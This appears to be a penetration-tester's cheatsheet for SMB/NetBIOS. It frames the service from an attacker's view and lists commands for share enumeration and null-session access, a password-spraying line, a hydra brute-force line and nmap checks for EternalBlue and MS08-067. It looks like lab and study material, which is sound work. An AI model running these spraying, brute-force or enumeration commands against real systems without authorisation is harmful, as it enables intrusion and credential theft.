# SMB / NetBIOS (445 / 139)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

Your most valuable Windows port. Think: **Pass-the-Hash, lateral movement, file share enumeration, NTLM relay attacks**. Check signing status immediately — no signing means NTLM relay is viable (free lateral movement). Enumerate every share for sensitive data; null sessions still work on misconfigured hosts. SMB on Linux = Samba, slightly different attack surface. **Common attack vectors:** EternalBlue (MS17-010), NTLM relay (Responder + ntlmrelayx), Pass-the-Hash, null session enumeration, share crawling for credentials/data, PrintNightmare, PetitPotam coercion.

## Enumerate

```bash
nmap -sV -sC -p 139,445 $IP
nmap --script "smb-enum-*,smb-vuln-*" -p 445 $IP
enum4linux-ng -A $IP
./enum4linux-ng.py 10.10.11.45 -A -C
nxc smb $IP -u '' -p '' --shares --users --pass-pol
```

## Connect to shares

```bash
smbclient -L //$IP -N
smbclient //$IP/share -N
smbmap -H $IP
smbmap -H $IP -u user -p pass
smbclient //10.129.15.164/CASSIE -U cassie%<password>
```

## Brute-force / spray

```bash
nxc smb $IP -u users.txt -p 'Spring2024!' --continue-on-success
hydra -l admin -P passwords.txt smb://$IP
```

## Check for vulns

```bash
nmap --script smb-vuln-ms17-010 -p 445 $IP   # EternalBlue
nmap --script smb-vuln-ms08-067 -p 445 $IP   # Conficker
```
